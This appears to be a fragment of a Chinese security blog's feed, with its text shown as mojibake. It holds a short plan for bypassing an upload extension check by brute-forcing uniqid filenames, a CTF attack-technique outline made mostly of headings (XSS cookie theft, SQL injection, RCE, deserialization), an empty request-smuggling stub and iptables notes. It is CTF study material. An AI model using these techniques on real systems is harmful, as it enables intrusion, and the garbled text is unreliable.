å­˜åœ¨å¯çˆ†ç ´çš„å¯èƒ½æ€§</li><li><code>$upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> allowExts æ–¹æ³•ç”¨äºæ£€æµ‹æ–‡ä»¶åå°±æ²¡ç”¨äº†, å› ä¸ºè¿™ç§æƒ…å†µé»˜è®¤åªæ£€æŸ¥ä¸€æ¬¡, è€Œå¤šæ–‡ä»¶ä¸Šä¼ æ—¶å°±ç»•è¿‡äº†æ–‡ä»¶æ£€æµ‹</li></ul><p>æ€è·¯ : </p><ol><li>è·å–æ–‡ä»¶ä¸Šä¼ çš„é»˜è®¤è·¯å¾„</li><li>ä¼ªé€ æ–‡ä»¶ä¸Šä¼ çš„HTTP Request è¯·æ±‚åŒ…</li><li>ä¸Šä¼ å¤šä¸ªæ–‡ä»¶</li><li>å¯¹æ–‡ä»¶åè¿›è¡Œçˆ†ç ´(å› ä¸º<strong>è¿ç»­ä¸Šä¼ çš„æ–‡ä»¶,uniqidå¤„ç†æ˜¯å¾®ç§’çº§åˆ«çš„</strong>,æ‰€ä»¥å·®åˆ«ä¸ä¼šå¤ªå¤§)</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;/a&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;a href=&quot;http://gv7.me/a</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HTTP request smuggling(è¯·æ±‚èµ°ç§)</title>
    <link href="https://hack-for.fun/bc077bb7.html"/>
    <id>https://hack-for.fun/bc077bb7.html</id>
    <published>2020-08-28T16:15:47.000Z</published>
    <updated>2020-08-30T15:54:57.583Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>æš‚ä¸”å’•å’•å’•ã€‚</p><h1 id="HTTP-åè®®"><a href="#HTTP-åè®®" class="headerlink" title="HTTP åè®®"></a>HTTP åè®®</h1><h1 id="è¯·æ±‚èµ°ç§æ¦‚å¿µ"><a href="#è¯·æ±‚èµ°ç§æ¦‚å¿µ" class="headerlink" title="è¯·æ±‚èµ°ç§æ¦‚å¿µ"></a>è¯·æ±‚èµ°ç§æ¦‚å¿µ</h1><h1 id="ä¾‹é¢˜è¯¦è§£"><a href="#ä¾‹é¢˜è¯¦è§£" class="headerlink" title="ä¾‹é¢˜è¯¦è§£"></a>ä¾‹é¢˜è¯¦è§£</h1><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;æš‚ä¸”å’•å’•å’•ã€‚&lt;/p&gt;
&lt;h1 id=&quot;HTTP-åè®®&quot;&gt;&lt;a href=&quot;#HTTP-åè®®&quot; class=&quot;headerlink&quot; title=&quot;HTTP åè®®&quot;&gt;&lt;/a&gt;HTTP åè®®&lt;/h1&gt;&lt;h1 id=&quot;è¯·æ±‚èµ°ç§æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
    <category term="åè®®å±‚å®‰å…¨" scheme="https://hack-for.fun/tags/%E5%8D%8F%E8%AE%AE%E5%B1%82%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF Tricks æ€»ç»“</title>
    <link href="https://hack-for.fun/a4738b93.html"/>
    <id>https://hack-for.fun/a4738b93.html</id>
    <published>2020-08-27T03:06:06.000Z</published>
    <updated>2020-08-29T02:28:42.264Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>ä»Šå¤©è¦å›å­¦æ ¡äº†ï¼Œå›å­¦æ ¡ä¹Ÿå¿«è€ƒå®éªŒç­äº†ï¼Œæˆ‘C è¯­è¨€å¤ªèœï¼ŒCTF ä¹Ÿå¾ˆä¹…æ²¡ç©äº†ã€‚æ‰€ä»¥ç®€å•æ€»ç»“ä¸€ä¸‹ä¹‹å‰æœ‰é‡åˆ°è¿‡çš„CTF çŸ¥è¯†ã€‚æ…¢æ…¢è¡¥å……ç»†èŠ‚å’Œå…¶ä»–å†…å®¹ã€‚</p><h1 id="è„šæœ¬é¢˜-pythonã€php"><a href="#è„šæœ¬é¢˜-pythonã€php" class="headerlink" title="è„šæœ¬é¢˜(pythonã€php)"></a>è„šæœ¬é¢˜(pythonã€php)</h1><h2 id="å¿«é€Ÿè®¡ç®—å¹¶å‘èµ·HTTP-è¯·æ±‚"><a href="#å¿«é€Ÿè®¡ç®—å¹¶å‘èµ·HTTP-è¯·æ±‚" class="headerlink" title="å¿«é€Ÿè®¡ç®—å¹¶å‘èµ·HTTP è¯·æ±‚"></a>å¿«é€Ÿè®¡ç®—å¹¶å‘èµ·HTTP è¯·æ±‚</h2><h2 id="å¿«é€Ÿå¤„ç†æ•°æ®"><a href="#å¿«é€Ÿå¤„ç†æ•°æ®" class="headerlink" title="å¿«é€Ÿå¤„ç†æ•°æ®"></a>å¿«é€Ÿå¤„ç†æ•°æ®</h2><h2 id="åœ¨å¤§é‡æ•°æ®ä¸­è·å–æŒ‡å®šå†…å®¹"><a href="#åœ¨å¤§é‡æ•°æ®ä¸­è·å–æŒ‡å®šå†…å®¹" class="headerlink" title="åœ¨å¤§é‡æ•°æ®ä¸­è·å–æŒ‡å®šå†…å®¹"></a>åœ¨å¤§é‡æ•°æ®ä¸­è·å–æŒ‡å®šå†…å®¹</h2><h2 id="php-ä¼ªéšæœºæ•°å®‰å…¨"><a href="#php-ä¼ªéšæœºæ•°å®‰å…¨" class="headerlink" title="php ä¼ªéšæœºæ•°å®‰å…¨"></a>php ä¼ªéšæœºæ•°å®‰å…¨</h2><p>æ¯”è¾ƒå¸¸è§çš„å°±æ˜¯seed çˆ†ç ´ã€‚</p><p><a href="https://www.anquanke.com/post/id/215349">https://www.anquanke.com/post/id/215349</a></p><h2 id="åŠ å¯†ç®—æ³•å¯ç ´è§£"><a href="#åŠ å¯†ç®—æ³•å¯ç ´è§£" class="headerlink" title="åŠ å¯†ç®—æ³•å¯ç ´è§£"></a>åŠ å¯†ç®—æ³•å¯ç ´è§£</h2><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h2><h2 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h2><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM-XSS"></a>DOM-XSS</h2><h2 id="XSS-æ‰“cookieçš„å§¿åŠ¿"><a href="#XSS-æ‰“cookieçš„å§¿åŠ¿" class="headerlink" title="XSS æ‰“cookieçš„å§¿åŠ¿"></a>XSS æ‰“cookieçš„å§¿åŠ¿</h2><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="æœ‰å›æ˜¾XXE"><a href="#æœ‰å›æ˜¾XXE" class="headerlink" title="æœ‰å›æ˜¾XXE"></a>æœ‰å›æ˜¾XXE</h2><h2 id="blind-XXE"><a href="#blind-XXE" class="headerlink" title="blind XXE"></a>blind XXE</h2><h2 id="oob"><a href="#oob" class="headerlink" title="oob"></a>oob</h2><h2 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h2><h1 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h1><p>SSI æ³¨å…¥å…¨ç§°Server-Side Includes Injectionï¼Œå³æœåŠ¡ç«¯åŒ…å«æ³¨å…¥ã€‚SSI æ˜¯ç±»ä¼¼äº CGIï¼Œç”¨äºåŠ¨æ€é¡µé¢çš„æŒ‡ä»¤ã€‚SSI æ³¨å…¥å…è®¸è¿œç¨‹åœ¨ Web åº”ç”¨ä¸­æ³¨å…¥è„šæœ¬æ¥æ‰§è¡Œä»£ç ã€‚</p><p>SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚</p><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="æ™®é€šæ³¨å…¥"><a href="#æ™®é€šæ³¨å…¥" class="headerlink" title="æ™®é€šæ³¨å…¥"></a>æ™®é€šæ³¨å…¥</h2><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><h2 id="è¯»ã€å†™æ–‡ä»¶"><a href="#è¯»ã€å†™æ–‡ä»¶" class="headerlink" title="è¯»ã€å†™æ–‡ä»¶"></a>è¯»ã€å†™æ–‡ä»¶</h2><h2 id="Oracle-mssql"><a href="#Oracle-mssql" class="headerlink" title="Oracle \ mssql"></a>Oracle \ mssql</h2><h2 id="bypass-2"><a href="#bypass-2" class="headerlink" title="bypass"></a>bypass</h2><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»"><a href="#SSRF-æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»" class="headerlink" title="SSRF æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»"></a>SSRF æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</h2><h2 id="SSRF-æ–‡ä»¶è¯»å–"><a href="#SSRF-æ–‡ä»¶è¯»å–" class="headerlink" title="SSRF æ–‡ä»¶è¯»å–"></a>SSRF æ–‡ä»¶è¯»å–</h2><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="å¸¸è§„RCE"><a href="#å¸¸è§„RCE" class="headerlink" title="å¸¸è§„RCE"></a>å¸¸è§„RCE</h2><h2 id="Bypass-disable-functions"><a href="#Bypass-disable-functions" class="headerlink" title="Bypass disable_functions"></a>Bypass disable_functions</h2><h2 id="Bypass-open-basedir"><a href="#Bypass-open-basedir" class="headerlink" title="Bypass open_basedir"></a>Bypass open_basedir</h2><h2 id="æ— å­—æ¯æ•°å­—webshell"><a href="#æ— å­—æ¯æ•°å­—webshell" class="headerlink" title="æ— å­—æ¯æ•°å­—webshell"></a>æ— å­—æ¯æ•°å­—webshell</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><h2 id="é™åˆ¶å­—ç¬¦é•¿åº¦çš„RCE"><a href="#é™åˆ¶å­—ç¬¦é•¿åº¦çš„RCE" class="headerlink" title="é™åˆ¶å­—ç¬¦é•¿åº¦çš„RCE"></a>é™åˆ¶å­—ç¬¦é•¿åº¦çš„RCE</h2><h2 id="æ— å›æ˜¾RCEã€OOB"><a href="#æ— å›æ˜¾RCEã€OOB" class="headerlink" title="æ— å›æ˜¾RCEã€OOB"></a>æ— å›æ˜¾RCEã€OOB</h2><p>ceyeï¼Œdnslogã€burp</p><h1 id="File-Inclusion-ã€Arbitary-File-Reading"><a href="#File-Inclusion-ã€Arbitary-File-Reading" class="headerlink" title="File Inclusion ã€Arbitary File Reading"></a>File Inclusion ã€Arbitary File Reading</h1><h2 id="æ—¥å¿—æ–‡ä»¶åŒ…å«"><a href="#æ—¥å¿—æ–‡ä»¶åŒ…å«" class="headerlink" title="æ—¥å¿—æ–‡ä»¶åŒ…å«"></a>æ—¥å¿—æ–‡ä»¶åŒ…å«</h2><h2 id="ä¸´æ—¶æ–‡ä»¶åŒ…å«-php-session-æ–‡ä»¶åŒ…å«-sess-tokenï¼Œupload-progress"><a href="#ä¸´æ—¶æ–‡ä»¶åŒ…å«-php-session-æ–‡ä»¶åŒ…å«-sess-tokenï¼Œupload-progress" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶åŒ…å«(php session æ–‡ä»¶åŒ…å«.. sess_tokenï¼Œupload_progress)"></a>ä¸´æ—¶æ–‡ä»¶åŒ…å«(php session æ–‡ä»¶åŒ…å«.. sess_tokenï¼Œupload_progress)</h2><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><h2 id="Tomcat-AJP-æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´"><a href="#Tomcat-AJP-æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="Tomcat AJP æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´"></a>Tomcat AJP æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´</h2><h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h2 id="phar-æ–‡ä»¶ä¸Šä¼ GetShell"><a href="#phar-æ–‡ä»¶ä¸Šä¼ GetShell" class="headerlink" title="phar æ–‡ä»¶ä¸Šä¼ GetShell"></a>phar æ–‡ä»¶ä¸Šä¼ GetShell</h2><h2 id="å›¾ç‰‡é©¬"><a href="#å›¾ç‰‡é©¬" class="headerlink" title="å›¾ç‰‡é©¬"></a>å›¾ç‰‡é©¬</h2><h2 id="bypassçš„å‡ ç§æ–¹æ³•"><a href="#bypassçš„å‡ ç§æ–¹æ³•" class="headerlink" title="bypassçš„å‡ ç§æ–¹æ³•"></a>bypassçš„å‡ ç§æ–¹æ³•</h2><h1 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h1><h2 id="git-svn-DS-Store-bak-swp-php-zip-rar-xml-INF"><a href="#git-svn-DS-Store-bak-swp-php-zip-rar-xml-INF" class="headerlink" title=".git .svn .DS_Store .bak .swp .php~ .zip .rar .xml .INF"></a>.git .svn .DS_Store .bak .swp .php~ .zip .rar .xml .INF</h2><h2 id="é…ç½®æ–‡ä»¶æ³„éœ²ã€-bash-history"><a href="#é…ç½®æ–‡ä»¶æ³„éœ²ã€-bash-history" class="headerlink" title="é…ç½®æ–‡ä»¶æ³„éœ²ã€.bash_history"></a>é…ç½®æ–‡ä»¶æ³„éœ²ã€.bash_history</h2><h1 id="HTTPã€HTTPSã€åˆ†å—ä¼ è¾“"><a href="#HTTPã€HTTPSã€åˆ†å—ä¼ è¾“" class="headerlink" title="HTTPã€HTTPSã€åˆ†å—ä¼ è¾“"></a>HTTPã€HTTPSã€åˆ†å—ä¼ è¾“</h1><h2 id="302-è·³è½¬"><a href="#302-è·³è½¬" class="headerlink" title="302 è·³è½¬"></a>302 è·³è½¬</h2><h2 id="XFF-ã€Referer-ã€ç­‰å¸¸è§HTTP-Header-çŸ¥è¯†ç‚¹"><a href="#XFF-ã€Referer-ã€ç­‰å¸¸è§HTTP-Header-çŸ¥è¯†ç‚¹" class="headerlink" title="XFF ã€Referer ã€ç­‰å¸¸è§HTTP Header çŸ¥è¯†ç‚¹"></a>XFF ã€Referer ã€ç­‰å¸¸è§HTTP Header çŸ¥è¯†ç‚¹</h2><h2 id="åˆ†å—ä¼ è¾“"><a href="#åˆ†å—ä¼ è¾“" class="headerlink" title="åˆ†å—ä¼ è¾“"></a>åˆ†å—ä¼ è¾“</h2><h1 id="Serialize-unserialize-php-python-java"><a href="#Serialize-unserialize-php-python-java" class="headerlink" title="Serialize unserialize(php,python,java)"></a>Serialize unserialize(php,python,java)</h1><h2 id="wakeup-ç»•è¿‡"><a href="#wakeup-ç»•è¿‡" class="headerlink" title="__wakeup ç»•è¿‡"></a>__wakeup ç»•è¿‡</h2><h2 id="O-çš„-bypass"><a href="#O-çš„-bypass" class="headerlink" title=":O: çš„ bypass"></a><code>:O:</code> çš„ bypass</h2><h2 id="Phar-æ‹“å±•ååºåˆ—åŒ–æ”»å‡»é“¾"><a href="#Phar-æ‹“å±•ååºåˆ—åŒ–æ”»å‡»é“¾" class="headerlink" title="Phar æ‹“å±•ååºåˆ—åŒ–æ”»å‡»é“¾"></a>Phar æ‹“å±•ååºåˆ—åŒ–æ”»å‡»é“¾</h2><h2 id="å­—ç¬¦ä¸²é€ƒé€¸ã€å¯¹è±¡é€ƒé€¸"><a href="#å­—ç¬¦ä¸²é€ƒé€¸ã€å¯¹è±¡é€ƒé€¸" class="headerlink" title="å­—ç¬¦ä¸²é€ƒé€¸ã€å¯¹è±¡é€ƒé€¸"></a>å­—ç¬¦ä¸²é€ƒé€¸ã€å¯¹è±¡é€ƒé€¸</h2><h2 id="pop-é“¾å­æ„é€ "><a href="#pop-é“¾å­æ„é€ " class="headerlink" title="pop é“¾å­æ„é€ "></a>pop é“¾å­æ„é€ </h2><h2 id="python-pickleåº“-ååºåˆ—åŒ–"><a href="#python-pickleåº“-ååºåˆ—åŒ–" class="headerlink" title="python pickleåº“ ååºåˆ—åŒ–"></a>python pickleåº“ ååºåˆ—åŒ–</h2><h2 id="Java-Weblogic-Shiro-ç­‰å„ç§ååºåˆ—åŒ–æ¼æ´"><a href="#Java-Weblogic-Shiro-ç­‰å„ç§ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Java Weblogic\Shiro\ç­‰å„ç§ååºåˆ—åŒ–æ¼æ´"></a>Java Weblogic\Shiro\ç­‰å„ç§ååºåˆ—åŒ–æ¼æ´</h2><h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><h2 id="Vm2-é€ƒé€¸"><a href="#Vm2-é€ƒé€¸" class="headerlink" title="Vm2 é€ƒé€¸"></a>Vm2 é€ƒé€¸</h2><h2 id="safe-eval"><a href="#safe-eval" class="headerlink" title="safe-eval"></a>safe-eval</h2><h2 id="jwt-token-ä¼ªé€ "><a href="#jwt-token-ä¼ªé€ " class="headerlink" title="jwt token ä¼ªé€ "></a>jwt token ä¼ªé€ </h2><h2 id="nodejsä»£ç å®¡è®¡"><a href="#nodejsä»£ç å®¡è®¡" class="headerlink" title="nodejsä»£ç å®¡è®¡"></a>nodejsä»£ç å®¡è®¡</h2><h1 id="DeBug-æ¨¡å¼æƒ…å†µä¸‹å­˜åœ¨çš„æ¼æ´æƒ…æ™¯"><a href="#DeBug-æ¨¡å¼æƒ…å†µä¸‹å­˜åœ¨çš„æ¼æ´æƒ…æ™¯" class="headerlink" title="DeBug æ¨¡å¼æƒ…å†µä¸‹å­˜åœ¨çš„æ¼æ´æƒ…æ™¯"></a>DeBug æ¨¡å¼æƒ…å†µä¸‹å­˜åœ¨çš„æ¼æ´æƒ…æ™¯</h1><h2 id="python-Flask-Debug-Mode-pin-ç å¯¼è‡´åˆ©ç”¨popen-RCE"><a href="#python-Flask-Debug-Mode-pin-ç å¯¼è‡´åˆ©ç”¨popen-RCE" class="headerlink" title="python Flask Debug Mode pin ç å¯¼è‡´åˆ©ç”¨popen RCE"></a>python Flask Debug Mode pin ç å¯¼è‡´åˆ©ç”¨popen RCE</h2><h1 id="ç¬¬ä¸‰æ–¹åº“å®‰å…¨"><a href="#ç¬¬ä¸‰æ–¹åº“å®‰å…¨" class="headerlink" title="ç¬¬ä¸‰æ–¹åº“å®‰å…¨"></a>ç¬¬ä¸‰æ–¹åº“å®‰å…¨</h1><h2 id="Fastjson-RCE"><a href="#Fastjson-RCE" class="headerlink" title="Fastjson RCE"></a>Fastjson RCE</h2><h2 id="Shiro-RememberMe-Cookie-å¤„çš„-RCE-èº«ä»½é‰´æƒç»•è¿‡"><a href="#Shiro-RememberMe-Cookie-å¤„çš„-RCE-èº«ä»½é‰´æƒç»•è¿‡" class="headerlink" title="Shiro RememberMe Cookie å¤„çš„ RCE \ èº«ä»½é‰´æƒç»•è¿‡"></a>Shiro RememberMe Cookie å¤„çš„ RCE \ èº«ä»½é‰´æƒç»•è¿‡</h2><h2 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h2><h2 id="Redis-ä¸»ä»å¤åˆ¶RCE-æœªæˆæƒ-ã€gopher-dict-åè®®çš„åˆ©ç”¨"><a href="#Redis-ä¸»ä»å¤åˆ¶RCE-æœªæˆæƒ-ã€gopher-dict-åè®®çš„åˆ©ç”¨" class="headerlink" title="Redis ä¸»ä»å¤åˆ¶RCE \ æœªæˆæƒ ã€gopher dict åè®®çš„åˆ©ç”¨"></a>Redis ä¸»ä»å¤åˆ¶RCE \ æœªæˆæƒ ã€gopher dict åè®®çš„åˆ©ç”¨</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;ä»Šå¤©è¦å›å­¦æ ¡äº†ï¼Œå›å­¦æ ¡ä¹Ÿå¿«è€ƒå®éªŒç­äº†ï¼Œæˆ‘C è¯­è¨€å¤ªèœï¼ŒCTF ä¹Ÿå¾ˆä¹…æ²¡ç©äº†ã€‚æ‰€ä»¥ç®€å•æ€»ç»“ä¸€ä¸‹ä¹‹å‰æœ‰é‡åˆ°è¿‡çš„CTF çŸ¥è¯†ã€‚æ…¢æ…¢è¡¥å……ç»†èŠ‚å’Œå…¶ä»–å†…å®¹ã€‚&lt;/p&gt;
&lt;h1 id=&quot;è„šæœ¬é¢˜-pythonã€php&quot;&gt;&lt;a href=&quot;#è„šæœ¬é¢˜-pythonã€ph</summary>
      
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>iptables å­¦ä¹ </title>
    <link href="https://hack-for.fun/13bb2df2.html"/>
    <id>https://hack-for.fun/13bb2df2.html</id>
    <published>2020-08-26T07:17:09.000Z</published>
    <updated>2020-08-26T15:25:09.938Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒèµ„æ–™ï¼š </p><p>(å†…å®¹å’Œå›¾ç‰‡)</p><p>å…¨æ•™ç¨‹ç³»åˆ—</p><p><a href="http://www.zsythink.net/archives/tag/iptables/">iptables å…¥é—¨ç³»åˆ—</a></p><blockquote><p>ä½œä¸ºå®‰å…¨ç‹— ï¼Œè‡ªè®¤ä¸ºçŸ¥é“æ¦‚å¿µå’ŒåŸºç¡€æ“ä½œå°±è¡Œäº†ï¼ˆæå®‰å…¨çš„è¦å­¦çš„ä¸œè¥¿çœŸçš„å¤ªå¤šäº†ã€‚</p></blockquote><p>åŸä½œè€…ä¸€å¼€å§‹è®²äº†é˜²ç«å¢™çš„çŸ¥è¯†ï¼Œç®—ä¸é”™çš„ç§‘æ™®ã€‚</p><h1 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h1><blockquote><p>ä»é€»è¾‘ä¸Šè®²ã€‚é˜²ç«å¢™å¯ä»¥å¤§ä½“åˆ†ä¸ºä¸»æœºé˜²ç«å¢™å’Œç½‘ç»œé˜²ç«å¢™ã€‚</p></blockquote><p>ä¸»æœºé˜²ç«å¢™ï¼šé’ˆå¯¹äºå•ä¸ªä¸»æœºè¿›è¡Œé˜²æŠ¤ã€‚</p><p>ç½‘ç»œé˜²ç«å¢™ï¼šå¾€å¾€å¤„äºç½‘ç»œå…¥å£æˆ–è¾¹ç¼˜ï¼Œé’ˆå¯¹äºç½‘ç»œå…¥å£è¿›è¡Œé˜²æŠ¤ï¼ŒæœåŠ¡äºé˜²ç«å¢™èƒŒåçš„æœ¬åœ°å±€åŸŸç½‘ã€‚</p><p>ç½‘ç»œé˜²ç«å¢™å’Œä¸»æœºé˜²ç«å¢™å¹¶ä¸å†²çªï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œç½‘ç»œé˜²ç«å¢™ä¸»å¤–ï¼ˆé›†ä½“ï¼‰ï¼Œ ä¸»æœºé˜²ç«å¢™ä¸»å†…ï¼ˆä¸ªäººï¼‰ã€‚</p><hr><blockquote><p>ä»ç‰©ç†ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥åˆ†ä¸ºç¡¬ä»¶é˜²ç«å¢™å’Œè½¯ä»¶é˜²ç«å¢™ã€‚</p></blockquote><p>ç¡¬ä»¶é˜²ç«å¢™ï¼šåœ¨ç¡¬ä»¶çº§åˆ«å®ç°éƒ¨åˆ†é˜²ç«å¢™åŠŸèƒ½ï¼Œå¦ä¸€éƒ¨åˆ†åŠŸèƒ½åŸºäºè½¯ä»¶å®ç°ï¼Œæ€§èƒ½é«˜ï¼Œæˆæœ¬é«˜ã€‚</p><p>è½¯ä»¶é˜²ç«å¢™ï¼šåº”ç”¨è½¯ä»¶å¤„ç†é€»è¾‘è¿è¡Œäºé€šç”¨ç¡¬ä»¶å¹³å°ä¹‹ä¸Šçš„é˜²ç«å¢™ï¼Œæ€§èƒ½ä½ï¼Œæˆæœ¬ä½ã€‚</p><p>è€Œæ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸ä¼šé‡è§WAFï¼ŒWeb Application Firewallï¼ˆWeb åº”ç”¨é˜²ç«å¢™ã€‚æ¯”å¦‚é•¿äº­çš„é›·æ± ï¼ˆSafeLineï¼‰ï¼ŒåŸºäºè¯­ä¹‰åˆ†æï¼Œéå¸¸å‰å®³ï¼Œè¦æ˜¯é‡åˆ°äº†å°±åˆ«æƒ³æ€ä¹ˆç»•äº†ï¼ˆÃ—</p><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p><code>iptables</code> åªæœ‰Linux ç³»çš„ç³»ç»Ÿæ‰æœ‰ã€‚</p><p><strong>iptables</strong>å…¶å®ä¸æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ä¸ªå®¢æˆ·ç«¯ä»£ç†ï¼Œç”¨æˆ·é€šè¿‡iptablesè¿™ä¸ªä»£ç†ï¼Œå°†ç”¨æˆ·çš„å®‰å…¨è®¾å®šæ‰§è¡Œåˆ°å¯¹åº”çš„â€å®‰å…¨æ¡†æ¶â€ä¸­ï¼Œè¿™ä¸ªâ€å®‰å…¨æ¡†æ¶â€æ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œè¿™ä¸ªæ¡†æ¶çš„åå­—å«<strong>netfilter</strong></p><p>netfilteræ‰æ˜¯é˜²ç«å¢™çœŸæ­£çš„å®‰å…¨æ¡†æ¶ï¼ˆframeworkï¼‰ï¼Œnetfilterä½äºå†…æ ¸ç©ºé—´ã€‚</p><p>iptableså…¶å®æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œä½äºç”¨æˆ·ç©ºé—´ï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå·¥å…·æ“ä½œçœŸæ­£çš„æ¡†æ¶ã€‚</p><p>netfilter/iptablesï¼ˆä¸‹æ–‡ä¸­ç®€ç§°ä¸ºiptablesï¼‰ç»„æˆLinuxå¹³å°ä¸‹çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ï¼Œä¸å¤§å¤šæ•°çš„Linuxè½¯ä»¶ä¸€æ 